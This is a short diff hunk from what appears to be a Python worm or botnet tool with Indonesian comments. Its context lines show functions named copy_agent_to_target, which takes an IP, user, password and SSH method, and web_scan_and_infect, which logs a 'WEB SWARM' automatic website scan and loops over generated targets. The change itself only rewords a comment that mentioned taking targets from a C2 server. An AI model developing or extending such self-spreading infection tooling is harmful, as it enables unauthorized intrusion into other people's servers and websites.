@@ -243,7 +243,7 @@ def copy_agent_to_target(ip, user, pwd, method="ssh"):
 def web_scan_and_infect():
     log("[*] 🌐 WEB SWARM: Memulai scan website otomatis...")
 
-    # Target sementara — bisa diganti dengan generator atau dari C2
+    # Target sementara — bisa dikembangkan
     targets = generate_web_targets()
 
     for target in targets:
